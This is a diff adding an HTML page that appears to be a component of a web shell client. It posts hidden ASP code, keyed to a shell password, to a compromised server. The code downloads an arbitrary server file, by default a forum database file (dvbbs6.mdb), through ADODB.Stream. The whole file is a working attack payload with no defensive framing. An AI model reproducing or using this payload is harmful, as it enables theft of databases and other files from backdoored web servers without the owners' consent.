@@ -1,0 +1,18 @@
+<link rel="stylesheet" type="text/css" href="lake2.css">
+<div align="center">DownLoad the file</div>
+<form name="xform" method="post" target="_blank">
+  <table width="80%"  border="0">
+    <tr>
+      <td width="9%">FilePath: </td>
+      <td width="91%"><input name="path" type="text" value="f:\dvbbs6.mdb" size="50"></td>
+    </tr>
+  </table>
+<input type="hidden" name="code" value='execute("theFileName=request(""path""):Response.Clear:fileName=split(theFileName,""\"")(uBound(split(theFileName,""\""))):set stream=server.createObject(""adodb.stream""):stream.open:stream.type=1:stream.loadFromFile(theFileName):response.addHeader ""Content-Disposition"", ""attachment;filename=""&filename:response.addHeader ""Content-Length"",stream.Size:response.charset=""UTF-8"":response.contentType=""application/octet-stream"":response.binaryWrite(stream.read):response.flush:stream.close:stream=nothing:response.End")'>
+</form>
+<script>
+function RUNonclick(){
+document.xform.code.name = parent.pwd.value;
+document.xform.action = parent.url.value;
+document.xform.submit();
+}
+</script>
